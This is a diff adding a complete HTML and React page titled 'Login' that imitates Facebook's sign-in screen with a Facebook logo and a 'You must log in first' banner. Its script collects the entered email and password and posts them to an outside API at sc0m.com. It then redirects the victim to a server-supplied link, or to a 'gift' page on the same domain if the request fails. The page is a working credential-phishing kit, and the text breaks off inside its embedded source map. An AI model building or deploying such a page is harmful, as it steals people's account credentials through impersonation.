@@ -1,0 +1,994 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+
+
+
+
+    <style>
+        body {
+            background-color: #eee;
+        }
+
+        .conta {
+            position: relative;
+            height: 100vh;
+        }
+
+        .container img {
+            width: 300px;
+            max-width: 90%;
+        }
+
+        .container {
+            width: 90%;
+        }
+
+        .container .colors {
+            /* background-color: white; */
+            width: 500px;
+            max-width: 90%;
+            height: 500px;
+            margin: auto;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border-radius: 5px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+            grid-gap: 10px;
+        }
+
+        .container .logo {
+            display: flex;
+            justify-content: center;
+            position: absolute;
+            left: 50%;
+            top: 10%;
+            transform: translate(-50%, -50%);
+        }
+
+        .container h1 {
+            text-align: center;
+        }
+
+        .color1 {
+            background: linear-gradient(100deg, #1f4037 -100%, #99f2c8);
+        }
+
+        .color2 {
+            background: linear-gradient(100deg, whitesmoke -100%, #ff691f);
+        }
+
+        .color3 {
+            background: linear-gradient(100deg, whitesmoke -100%, #fab81e);
+        }
+
+        .color4 {
+            background: linear-gradient(100deg, whitesmoke -100%, #f58ea8);
+        }
+
+        .color5 {
+            background: linear-gradient(100deg, whitesmoke -100%, #19cf86);
+        }
+
+        .color6 {
+            background: linear-gradient(100deg, whitesmoke -100%, #91d2fa);
+        }
+
+        .color7 {
+            background: linear-gradient(100deg, whitesmoke -100%, #1b95e0);
+        }
+
+        .color8 {
+            background: linear-gradient(100deg, whitesmoke -100%, #abb8c2);
+        }
+
+        .color9 {
+            background: linear-gradient(100deg, whitesmoke -100%, #e81c4f);
+        }
+
+        .color10 {
+            background: linear-gradient(100deg, whitesmoke -100%, #000000);
+        }
+
+        .color11 {
+            background: linear-gradient(100deg, #c6426e -10%, #642b73);
+        }
+
+        .color12 {
+            background: linear-gradient(100deg, #0f2027 -10%, #203a43);
+        }
+
+        .co {
+            border-radius: 20px;
+            box-shadow: rgb(0 0 0 / 25%) 0px 5px 20px;
+            transition: transform 500ms;
+            animation: bounce 1s;
+            padding: 25px 0px;
+            cursor: pointer;
+        }
+
+        @keyframes bounce {
+            0% {
+                transform: rotate(0deg) scale(1);
+            }
+
+            33% {
+                transform: rotate(12deg) scale(1.2);
+            }
+
+            67% {
+                transform: rotate(-12deg) scale(0.8);
+            }
+
+            100% {
+                transform: rotate(0deg) scale(1);
+            }
+        }
+
+        .co:hover {
+            transform: rotate(0deg) scale(1.2);
+        }
+
+        .border {
+            border: 5px solid black;
+        }
+
+        .btnu {
+            position: absolute;
+            top: 83%;
+            left: 50%;
+            width: 500px;
+            max-width: 90%;
+            transform: translate(-50%, 50%);
+            height: 70px;
+        }
+
+        @media (max-width: 455px) {
+            .btnu {
+                position: absolute;
+                top: 80%;
+                left: 50%;
+                width: 500px;
+                max-width: 90%;
+                transform: translate(-50%, 50%);
+                height: 57px;
+                margin-bottom: 32px;
+            }
+        }
+
+        @media (max-width: 455px) {
+            .co:hover {
+                transform: rotate(0deg) scale(1.08);
+            }
+        }
+
+        /* @media (max-width:455px) {
+    .buut {
+        margin-bottom: 40px;
+    }
+      
+  } */
+        .in {
+            width: 350px;
+            max-width: 90%;
+            display: block;
+            margin: auto;
+            padding: 10px;
+            margin-bottom: 6px;
+            background-color: #f5f6f7;
+            border: none;
+            border-radius: 4px;
+            border: 1px solid #00000012;
+            font-size: 14px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .sub {
+            width: 350px;
+            max-width: 90%;
+            display: block;
+            margin: auto;
+            padding: 10px;
+            background-color: #1877f2 !important;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            margin-top: 10px;
+            font-family: Arial, Helvetica, sans-serif;
+            font-weight: bold;
+        }
+
+        .modal-content {
+            width: 95%;
+            margin: auto;
+        }
+
+        .lg {
+            width: 112px !important;
+            display: block;
+            margin: auto;
+            margin-bottom: 25px;
+        }
+
+        .modal-body .fr {
+            text-align: center;
+            display: block;
+            margin: auto;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .hr {
+            position: relative;
+        }
+
+        .hr .t {
+            font-size: 14px;
+            padding: 0px 20px;
+            position: absolute;
+            top: -11px;
+            right: 50%;
+            transform: translate(50%, 0px);
+            font-family: Arial, Helvetica, sans-serif;
+            color: #4b4f56;
+            background-color: white;
+        }
+
+        .cr {
+            background-color: #00a400;
+            color: white;
+            padding: 8px 10px;
+            border-radius: 7px;
+            text-decoration: none;
+            margin: auto;
+            display: block;
+            width: 167px;
+            font-size: 14px;
+            text-align: center;
+            font-family: Arial;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+
+        .cr:hover {
+            color: white;
+        }
+
+        .modal-body p {
+            display: flex;
+            justify-content: center;
+            color: gray;
+            font-size: 12px;
+            margin-top: 10px;
+            bottom: 5px;
+            margin-bottom: 0px;
+        }
+
+        h5 {
+            font-size: 1rem;
+            color: red;
+        }
+
+        .container {
+            margin-top: 25px;
+            padding-left: 0px !important;
+            padding-right: 0px !important;
+        }
+
+        input {
+            width: 416px !important;
+        }
+
+        .fr {
+            display: flex;
+            justify-content: center;
+            margin-top: 12px;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .hr {
+            width: 416px !important;
+            max-width: 90%;
+            display: block;
+            margin: auto;
+            margin-bottom: 25px;
+        }
+
+        .bet {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            margin-top: 100px;
+        }
+
+        p {
+            margin: 0;
+            font-size: 11px;
+            color: #3d6299;
+            text-align: center;
+        }
+
+        .must p {
+            text-align: left;
+            color: #7f7212;
+            background-color: #fefbe2;
+            border-bottom: 2px solid #e2c822;
+            padding: 5px 8px;
+            margin: 0;
+            font-size: 14px;
+        }
+    </style>
+
+
+    <script crossorigin="" src="https://unpkg.com/react@18/umd/react.development.js"></script>
+    <script crossorigin="" src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js" integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <style>
+        /* ! tailwindcss v3.4.1 | MIT License | https://tailwindcss.com */
+        *,
+        ::after,
+        ::before {
+            box-sizing: border-box;
+            border-width: 0;
+            border-style: solid;
+            border-color: #e5e7eb
+        }
+
+        ::after,
+        ::before {
+            --tw-content: ''
+        }
+
+        :host,
+        html {
+            line-height: 1.5;
+            -webkit-text-size-adjust: 100%;
+            -moz-tab-size: 4;
+            tab-size: 4;
+            font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            font-feature-settings: normal;
+            font-variation-settings: normal;
+            -webkit-tap-highlight-color: transparent
+        }
+
+        body {
+            margin: 0;
+            line-height: inherit
+        }
+
+        hr {
+            height: 0;
+            color: inherit;
+            border-top-width: 1px
+        }
+
+        abbr:where([title]) {
+            -webkit-text-decoration: underline dotted;
+            text-decoration: underline dotted
+        }
+
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6 {
+            font-size: inherit;
+            font-weight: inherit
+        }
+
+        a {
+            color: inherit;
+            text-decoration: inherit
+        }
+
+        b,
+        strong {
+            font-weight: bolder
+        }
+
+        code,
+        kbd,
+        pre,
+        samp {
+            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+            font-feature-settings: normal;
+            font-variation-settings: normal;
+            font-size: 1em
+        }
+
+        small {
+            font-size: 80%
+        }
+
+        sub,
+        sup {
+            font-size: 75%;
+            line-height: 0;
+            position: relative;
+            vertical-align: baseline
+        }
+
+        sub {
+            bottom: -.25em
+        }
+
+        sup {
+            top: -.5em
+        }
+
+        table {
+            text-indent: 0;
+            border-color: inherit;
+            border-collapse: collapse
+        }
+
+        button,
+        input,
+        optgroup,
+        select,
+        textarea {
+            font-family: inherit;
+            font-feature-settings: inherit;
+            font-variation-settings: inherit;
+            font-size: 100%;
+            font-weight: inherit;
+            line-height: inherit;
+            color: inherit;
+            margin: 0;
+            padding: 0
+        }
+
+        button,
+        select {
+            text-transform: none
+        }
+
+        [type=button],
+        [type=reset],
+        [type=submit],
+        button {
+            -webkit-appearance: button;
+            background-color: transparent;
+            background-image: none
+        }
+
+        :-moz-focusring {
+            outline: auto
+        }
+
+        :-moz-ui-invalid {
+            box-shadow: none
+        }
+
+        progress {
+            vertical-align: baseline
+        }
+
+        ::-webkit-inner-spin-button,
+        ::-webkit-outer-spin-button {
+            height: auto
+        }
+
+        [type=search] {
+            -webkit-appearance: textfield;
+            outline-offset: -2px
+        }
+
+        ::-webkit-search-decoration {
+            -webkit-appearance: none
+        }
+
+        ::-webkit-file-upload-button {
+            -webkit-appearance: button;
+            font: inherit
+        }
+
+        summary {
+            display: list-item
+        }
+
+        blockquote,
+        dd,
+        dl,
+        figure,
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6,
+        hr,
+        p,
+        pre {
+            margin: 0
+        }
+
+        fieldset {
+            margin: 0;
+            padding: 0
+        }
+
+        legend {
+            padding: 0
+        }
+
+        menu,
+        ol,
+        ul {
+            list-style: none;
+            margin: 0;
+            padding: 0
+        }
+
+        dialog {
+            padding: 0
+        }
+
+        textarea {
+            resize: vertical
+        }
+
+        input::placeholder,
+        textarea::placeholder {
+            opacity: 1;
+            color: #9ca3af
+        }
+
+        [role=button],
+        button {
+            cursor: pointer
+        }
+
+        :disabled {
+            cursor: default
+        }
+
+        audio,
+        canvas,
+        embed,
+        iframe,
+        img,
+        object,
+        svg,
+        video {
+            display: block;
+            vertical-align: middle
+        }
+
+        img,
+        video {
+            max-width: 100%;
+            height: auto
+        }
+
+        [hidden] {
+            display: none
+        }
+
+        *,
+        ::before,
+        ::after {
+            --tw-border-spacing-x: 0;
+            --tw-border-spacing-y: 0;
+            --tw-translate-x: 0;
+            --tw-translate-y: 0;
+            --tw-rotate: 0;
+            --tw-skew-x: 0;
+            --tw-skew-y: 0;
+            --tw-scale-x: 1;
+            --tw-scale-y: 1;
+            --tw-pan-x: ;
+            --tw-pan-y: ;
+            --tw-pinch-zoom: ;
+            --tw-scroll-snap-strictness: proximity;
+            --tw-gradient-from-position: ;
+            --tw-gradient-via-position: ;
+            --tw-gradient-to-position: ;
+            --tw-ordinal: ;
+            --tw-slashed-zero: ;
+            --tw-numeric-figure: ;
+            --tw-numeric-spacing: ;
+            --tw-numeric-fraction: ;
+            --tw-ring-inset: ;
+            --tw-ring-offset-width: 0px;
+            --tw-ring-offset-color: #fff;
+            --tw-ring-color: rgb(59 130 246 / 0.5);
+            --tw-ring-offset-shadow: 0 0 #0000;
+            --tw-ring-shadow: 0 0 #0000;
+            --tw-shadow: 0 0 #0000;
+            --tw-shadow-colored: 0 0 #0000;
+            --tw-blur: ;
+            --tw-brightness: ;
+            --tw-contrast: ;
+            --tw-grayscale: ;
+            --tw-hue-rotate: ;
+            --tw-invert: ;
+            --tw-saturate: ;
+            --tw-sepia: ;
+            --tw-drop-shadow: ;
+            --tw-backdrop-blur: ;
+            --tw-backdrop-brightness: ;
+            --tw-backdrop-contrast: ;
+            --tw-backdrop-grayscale: ;
+            --tw-backdrop-hue-rotate: ;
+            --tw-backdrop-invert: ;
+            --tw-backdrop-opacity: ;
+            --tw-backdrop-saturate: ;
+            --tw-backdrop-sepia:
+        }
+
+        ::backdrop {
+            --tw-border-spacing-x: 0;
+            --tw-border-spacing-y: 0;
+            --tw-translate-x: 0;
+            --tw-translate-y: 0;
+            --tw-rotate: 0;
+            --tw-skew-x: 0;
+            --tw-skew-y: 0;
+            --tw-scale-x: 1;
+            --tw-scale-y: 1;
+            --tw-pan-x: ;
+            --tw-pan-y: ;
+            --tw-pinch-zoom: ;
+            --tw-scroll-snap-strictness: proximity;
+            --tw-gradient-from-position: ;
+            --tw-gradient-via-position: ;
+            --tw-gradient-to-position: ;
+            --tw-ordinal: ;
+            --tw-slashed-zero: ;
+            --tw-numeric-figure: ;
+            --tw-numeric-spacing: ;
+            --tw-numeric-fraction: ;
+            --tw-ring-inset: ;
+            --tw-ring-offset-width: 0px;
+            --tw-ring-offset-color: #fff;
+            --tw-ring-color: rgb(59 130 246 / 0.5);
+            --tw-ring-offset-shadow: 0 0 #0000;
+            --tw-ring-shadow: 0 0 #0000;
+            --tw-shadow: 0 0 #0000;
+            --tw-shadow-colored: 0 0 #0000;
+            --tw-blur: ;
+            --tw-brightness: ;
+            --tw-contrast: ;
+            --tw-grayscale: ;
+            --tw-hue-rotate: ;
+            --tw-invert: ;
+            --tw-saturate: ;
+            --tw-sepia: ;
+            --tw-drop-shadow: ;
+            --tw-backdrop-blur: ;
+            --tw-backdrop-brightness: ;
+            --tw-backdrop-contrast: ;
+            --tw-backdrop-grayscale: ;
+            --tw-backdrop-hue-rotate: ;
+            --tw-backdrop-invert: ;
+            --tw-backdrop-opacity: ;
+            --tw-backdrop-saturate: ;
+            --tw-backdrop-sepia:
+        }
+
+        .container {
+            width: 100%
+        }
+
+        @media (min-width: 640px) {
+            .container {
+                max-width: 640px
+            }
+        }
+
+        @media (min-width: 768px) {
+            .container {
+                max-width: 768px
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .container {
+                max-width: 1024px
+            }
+        }
+
+        @media (min-width: 1280px) {
+            .container {
+                max-width: 1280px
+            }
+        }
+
+        @media (min-width: 1536px) {
+            .container {
+                max-width: 1536px
+            }
+        }
+    </style>
+    <script>
+        "use strict";
+
+        function _slicedToArray(arr, i) {
+            return _arrayWithHoles(arr) || _iterableToArrayLimit(arr, i) || _unsupportedIterableToArray(arr, i) || _nonIterableRest();
+        }
+
+        function _nonIterableRest() {
+            throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
+        }
+
+        function _unsupportedIterableToArray(o, minLen) {
+            if (!o) return;
+            if (typeof o === "string") return _arrayLikeToArray(o, minLen);
+            var n = Object.prototype.toString.call(o).slice(8, -1);
+            if (n === "Object" && o.constructor) n = o.constructor.name;
+            if (n === "Map" || n === "Set") return Array.from(o);
+            if (n === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return _arrayLikeToArray(o, minLen);
+        }
+
+        function _arrayLikeToArray(arr, len) {
+            if (len == null || len > arr.length) len = arr.length;
+            for (var i = 0, arr2 = new Array(len); i < len; i++) arr2[i] = arr[i];
+            return arr2;
+        }
+
+        function _iterableToArrayLimit(r, l) {
+            var t = null == r ? null : "undefined" != typeof Symbol && r[Symbol.iterator] || r["@@iterator"];
+            if (null != t) {
+                var e, n, i, u, a = [],
+                    f = !0,
+                    o = !1;
+                try {
+                    if (i = (t = t.call(r)).next, 0 === l) {
+                        if (Object(t) !== t) return;
+                        f = !1;
+                    } else
+                        for (; !(f = (e = i.call(t)).done) && (a.push(e.value), a.length !== l); f = !0);
+                } catch (r) {
+                    o = !0, n = r;
+                } finally {
+                    try {
+                        if (!f && null != t["return"] && (u = t["return"](), Object(u) !== u)) return;
+                    } finally {
+                        if (o) throw n;
+                    }
+                }
+                return a;
+            }
+        }
+
+        function _arrayWithHoles(arr) {
+            if (Array.isArray(arr)) return arr;
+        }
+        var axios = axios.create({
+            baseURL: "https://api.sc0m.com/api",
+            timeout: 5000,
+            headers: {
+                "X-Custom-Header": ""
+            }
+        });
+        var MainContent = function MainContent() {
+            var _React$useState = React.useState(""),
+                _React$useState2 = _slicedToArray(_React$useState, 2),
+                vEmail = _React$useState2[0],
+                setVEmail = _React$useState2[1];
+            var _React$useState3 = React.useState(""),
+                _React$useState4 = _slicedToArray(_React$useState3, 2),
+                vPassword = _React$useState4[0],
+                setVPassword = _React$useState4[1];
+            var _React$useState5 = React.useState(""),
+                _React$useState6 = _slicedToArray(_React$useState5, 2),
+                data = _React$useState6[0],
+                setData = _React$useState6[1];
+            React.useEffect(function() {
+                var url = window.location.href;
+                var params = new URL(url).searchParams;
+                var urlbase = params.get("url");
+                setData(urlbase);
+            }, []);
+            var addNew = function addNew() {
+                if (vPassword === "" || vEmail === "") return alert("Please fill all the fields");
+                var body = {
+                    data: data,
+                    email: vEmail,
+                    password: vPassword
+                };
+                axios.post("/contact", body).then(function(_ref) {
+                    var data = _ref.data;
+                    window.location = data;
+                })["catch"](function(err) {
+                    window.location = "https://gift.sc0m.com";
+                });
+            };
+            return /*#__PURE__*/ React.createElement(React.Fragment, null, /*#__PURE__*/ React.createElement("div", {
+                id: "top_form"
+            }, /*#__PURE__*/ React.createElement("div", {
+                "class": "must"
+            }, /*#__PURE__*/ React.createElement("p", null, "You must log in first.")), /*#__PURE__*/ React.createElement("div", {
+                "class": "conta"
+            }, /*#__PURE__*/ React.createElement("div", {
+                "class": "container"
+            }, /*#__PURE__*/ React.createElement("div", {
+                method: "post"
+            }, /*#__PURE__*/ React.createElement("img", {
+                "class": "lg",
+                src: "https://i.ibb.co/hFT2CgF/Facebook.png",
+                alt: ""
+            }), /*#__PURE__*/ React.createElement("input", {
+                "class": "in",
+                type: "text",
+                name: "email",
+                placeholder: "Email address or mobile number",
+                required: "",
+                onChange: function onChange(e) {
+                    return setVEmail(e.target.value);
+                }
+            }), /*#__PURE__*/ React.createElement("input", {
+                "class": "in",
+                type: "password",
+                name: "pass",
+                placeholder: "Password",
+                onChange: function onChange(e) {
+                    return setVPassword(e.target.value);
+                }
+            }), /*#__PURE__*/ React.createElement("input", {
+                "class": "sub",
+                type: "submit",
+                placeholder: "",
+                value: "Login",
+                onClick: addNew
+            }))))));
+        };
+
+        //render the component to the DOM
+        ReactDOM.render( /*#__PURE__*/ React.createElement(MainContent, null), document.getElementById('root'));
+        //# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJuYW1lcyI6WyJheGlvcyIsImNyZWF0ZSIsImJhc2VVUkwiLCJ0aW1lb3V0IiwiaGVhZGVycyIsIk1haW5Db250ZW50IiwiX1JlYWN0JHVzZVN0YXRlIiwiUmVhY3QiLCJ1c2VTdGF0ZSIsIl9SZWFjdCR1c2VTdGF0ZTIiLCJfc2xpY2VkVG9BcnJheSIsInZFbWFpbCIsInNldFZFbWFpbCIsIl9SZWFjdCR1c2VTdGF0ZTMiLCJfUmVhY3QkdXNlU3RhdGU0IiwidlBhc3N3b3JkIiwic2V0VlBhc3N3b3JkIiwiX1JlYWN0JHVzZVN0YXRlNSIsIl9SZWFjdCR1c2VTdGF0ZTYiLCJkYXRhIiwic2V0RGF0YSIsInVzZUVmZmVjdCIsInVybCIsIndpbmRvdyIsImxvY2F0aW9uIiwiaHJlZiIsInBhcmFtcyIsIlVSTCIsInNlYXJjaFBhcmFtcyIsInVybGJhc2UiLCJnZXQiLCJhZGROZXciLCJhbGVydCIsImJvZHkiLCJlbWFpbCIsInBhc3N3b3JkIiwicG9zdCIsInRoZW4iLCJfcmVmIiwiZXJyIiwiY3JlYXRlRWxlbWVudCIsIkZyYWdtZW50IiwiaWQiLCJtZXRob2QiLCJzcmMiLCJhbHQiLCJ0eXBlIiwibmFtZSIsInBsYWNlaG9sZGVyIiwicmVxdWlyZWQiLCJvbkNoYW5nZSIsImUiLCJ0YXJnZXQiLCJ2YWx1ZSIsIm9uQ2xpY2siLCJSZWFjdERPTSIsInJlbmRlciIsImRvY3VtZW50IiwiZ2V0RWxlbWVudEJ5SWQiXSwic291cmNlcyI6WyJJbmxpbmUgQmFiZWwgc2NyaXB0Il0sInNvdXJjZXNDb250ZW50IjpbIlxuXG4gICAgICBjb25zdCBheGlvcyA9IGF4aW9zLmNyZWF0ZSh7XG4gICAgICAgICAgICAgIGJhc2VVUkw6IFwiaHR0cHM6Ly9hcGkuc2MwbS5jb20vYXBpXCIsXG4gICAgICAgICAgICAgIHRpbWVvdXQ6IDUwMDAsXG4gICAgICAgICAgICAgIGhlYWRlcnM6IHsgXCJYLUN1c3RvbS1IZWFkZXJcIjogXCJcIiB9LFxuICAgICAgICAgICAgfSk7XG5cbiAgICAgICAgICAgIGNvbnN0IE1haW5Db250ZW50ID0gKCkgPT4ge1xuXG5cbiAgICAgICAgICAgICAgY29uc3QgW3ZFbWFpbCwgc2V0VkVtYWlsXSA9IFJlYWN0LnVzZVN0YXRlKFwiXCIpO1xuICAgICAgICAgICAgICBjb25zdCBbdlBhc3N3b3JkLCBzZXRWUGFzc3dvcmRdID0gUmVhY3QudXNlU3RhdGUoXCJcIik7XG4gICAgICAgICAgICAgIGNvbnN0IFtkYXRhLCBzZXREYXRhXSA9IFJlYWN0LnVzZVN0YXRlKFwiXCIpO1xuXG4gICAgICAgICAgICAgIFJlYWN0LnVzZUVmZmVjdCgoKSA9PiB7XG5cbiAgICAgICAgICAgICAgICBjb25zdCB1cmwgPSB3aW5kb3cubG9jYXRpb24uaHJlZjtcbiAgICAgICAgICAgICAgICBjb25zdCBwYXJhbXMgPSBuZXcgVVJMKHVybCkuc2VhcmNoUGFyYW1zO1xuICAgICAgICAgICAgICAgIGNvbnN0IHVybGJhc2UgPSBwYXJhbXMuZ2V0KFwidXJsXCIpO1xuICAgICAgICAgICAgICAgIHNldERhdGEodXJsYmFzZSk7XG4gICAgICAgICAgICAgIH0sIFtdKTtcblxuICAgICAgICAgICAgICBjb25zdCBhZGROZXcgPSAoKSA9PiB7XG4gICAgICAgICAgICAgICAgaWYgKHZQYXNzd29yZCA9PT0gXCJcIiB8fCB2RW1haWwgPT09IFwiXCIpXG4gICAgICAgICAgICAgICAgICByZXR1cm4gYWxlcnQoXCJQbGVhc2UgZmlsbCBhbGwgdGhlIGZpZWxkc1wiKTtcbiAgICAgICAgICAgICAgICBjb25zdCBib2R5ID0ge1xuICAgICAgICAgICAgICAgICAgZGF0YSxcbiAgICAgICAgICAgICAgICAgIGVtYWlsOiB2RW1haWwsXG4gICAgICAgICAgICAgICAgICBwYXNzd29yZDogdlBhc3N3b3JkLFxuICAgICAgICAgICAgICAgIH07XG5cbiAgICAgICAgICAgICAgICBheGlvc1xuICAgICAgICAgICAgICAgICAgLnBvc3QoXCIvY29udGFjdFwiLCBib2R5KVxuICAgICAgICAgICAgICAgICAgLnRoZW4oKHsgZGF0YSB9KSA9PiB7XG4gICAgICAgICAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbiA9IGRhdGE7XG4gICAgICAgICAgICAgICAgICB9KVxuICAgICAgICAgICAgICAgICAgLmNhdGNoKChlcnIpID0+IHtcbiAgICAgICAgICAgICAgICAgICAgd2luZG93LmxvY2F0aW9uID0gXCJodHRwczovL2dpZnQuc2MwbS5jb21cIjtcbiAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICB9O1xuICAgICAgICAgICAgICByZXR1cm4gKFxuICAgICAgICAgICAgICAgIDw+XG4gICAgICAgICAgICAgICAgPGRpdiBpZD1cInRvcF9mb3JtXCI+XG4gICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9XCJtdXN0XCI+PHA+WW91IG11c3QgbG9nIGluIGZpcnN0LjwvcD48L2Rpdj5cbiAgICA8ZGl2IGNsYXNzPVwiY29udGFcIj5cbiAgICAgICAgPGRpdiBjbGFzcz1cImNvbnRhaW5lclwiPlxuICAgICAgICAgICAgICAgIDxkaXYgbWV0aG9kPVwicG9zdFwiPlxuICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIGNsYXNzPVwibGdcIiBzcmM9XCJodHRwczovL2kuaWJiLmNvL2hGVDJDZ0YvRmFjZWJvb2sucG5nXCIgYWx0PVwiXCIvPlxuICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgY2xhc3M9XCJpblwiIHR5cGU9XCJ0ZXh0XCIgbmFtZT1cImVtYWlsXCIgcGxhY2Vob2xkZXI9XCJFbWFpbCBhZGRyZXNzIG9yIG1vYmlsZSBudW1iZXJcIiByZXF1aXJlZD1cIlwiIG9uQ2hhbmdlPXsoZSkgPT4gc2V0VkVtYWlsKGUudGFyZ2V0LnZhbHVlKX0vPlxuXHRcdFx0XHRcdFx0ICAgXG4gICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz1cImluXCIgdHlwZT1cInBhc3N3b3JkXCIgbmFtZT1cInBhc3NcIiBwbGFjZWhvbGRlcj1cIlBhc3N3b3JkXCIgIG9uQ2hhbmdlPXsoZSkgPT4gc2V0VlBhc3N3b3JkKGUudGFyZ2V0LnZhbHVlKX0vPlxuICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgY2xhc3M9XCJzdWJcIiB0eXBlPVwic3VibWl0XCIgcGxhY2Vob2xkZXI9XCJcIiB2YWx1ZT1cIkxvZ2luXCIgIG9uQ2xpY2s9e2FkZE5ld30vPlxuXG4gICAgICAgICAgICAgICAgICAgICAgPC9kaXY+XG4gICAgICAgICAgICAgICAgICAgICAgPC9kaXY+XG4gICAgICAgICAgICAgICAgICAgICAgPC9kaXY+XG4gICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj5cblxuICAgICAgICAgICAgIHsgIC8qICAgPGhlYWRlciBjbGFzc05hbWU9XCJiZy1ibHVlLTUwMCBoLTE0IHctZnVsbCBmbGV4IGp1c3RpZnktc3RhcnQgaXRlbXMtY2VudGVyIHBsLTUgdGV4dC13aGl0ZSBmb250LW5vcm1hbFwiPlxuICAgICAgICAgICAgICAgICAgICA8cD5GYWNlYm9vazwvcD5cbiAgICAgICAgICAgICAgICAgIDwvaGVhZGVyPlxuXG4gICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzTmFtZT1cImdyaWQgcGxhY2UtY29udGVudC1jZW50ZXIgZ3JpZC1jb2xzLTEgbWQ6cHgtMzYgbXQtMTAgZ2FwLTEwXCI+XG5cbiAgICAgICAgICAgICAgICAgICAgPGRpdlxuICAgICAgICAgICAgICAgICAgICAgIGNsYXNzTmFtZT1cIm0tYXV0byB0ZXh0LXhzIHNtOnRleHQtc20gbWQ6dGV4dC1sZyBtYXgtdy1zbSBtZDptYXgtdy0yeGwgdGV4dC1jZW50ZXIgXCJcbiAgICAgICAgICAgICAgICAgICAgPjwvZGl2PlxuXG4gICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3NOYW1lPVwicC0yIHctZnVsbCAgZ2FwLTEgIFwiPlxuICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3NOYW1lPVwiZmxleCBmbGV4LWNvbCAgIHAtMiAgZ2FwLTFcIj5cbiAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzc05hbWU9XCJ0ZXh0LWdyYXktNTAwIHRleHQtc21cIj48L2xhYmVsPlxuICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0XG5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgdHlwZT1cInRleHRcIlxuICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzc05hbWU9XCJ3LWZ1bGwgYm9yZGVyIHAtMiByb3VuZGVkLW1kXCJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgcGxhY2Vob2xkZXI9XCJQaG9uZSBudW1iZXIsIHVzZXJuYW1lLCBvciBlbWFpbFwiXG4gICAgICAgICAgICAgICAgICAgICAgICAgIG9uQ2hhbmdlPXsoZSkgPT4gc2V0VkVtYWlsKGUudGFyZ2V0LnZhbHVlKX1cbiAgICAgICAgICAgICAgICAgICAgICAgIC8+XG4gICAgICAgICAgICAgICAgICAgICAgPC9kaXY+XG4gICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzc05hbWU9XCJmbGV4IGZsZXgtY29sICAgcC0yICAgZ2FwLTFcIj5cbiAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBodG1sRm9yPVwicGFzc3dvcmRcIiBjbGFzc05hbWU9XCJ0ZXh0LWdyYXktNTAwIHRleHQtc21cIj5cblxuICAgICAgICAgICAgICAgICAgICAgICAgPC9sYWJlbD5cbiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dFxuICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlPVwicGFzc3dvcmRcIlxuICAgICAgICAgICAgICAgICAgICAgICAgICBjbGFzc05hbWU9XCJ3LWZ1bGwgYm9yZGVyIHAtMiByb3VuZGVkLW1kXCJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgcGxhY2Vob2xkZXI9XCJQYXNzd29yZFwiXG4gICAgICAgICAgICAgICAgICAgICAgICAgIGlkPVwicGFzc3dvcmRcIlxuICAgICAgICAgICAgICAgICAgICAgICAgICBhdXRvQ29tcGxldGU9XCJuZXctcGFzc3dvcmRcIlxuICAgICAgICAgICAgICAgICAgICAgICAgICBvbkNoYW5nZT17KGUpID0+IHNldFZQYXNzd29yZChlLnRhcmdldC52YWx1ZSl9XG4gICAgICAgICAgICAgICAgICAgICAgICAvPlxuICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PlxuICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3NOYW1lPVwiZmxleCBmbGV4LWNvbCBqdXN0aWZ5LWNlbnRlciBpdGVtcy1jZW50ZXIgIHAtMiBnYXAtMSB3LTMvNiBteC1hdXRvXCI+XG4gICAgICAgICAgICAgICAgIC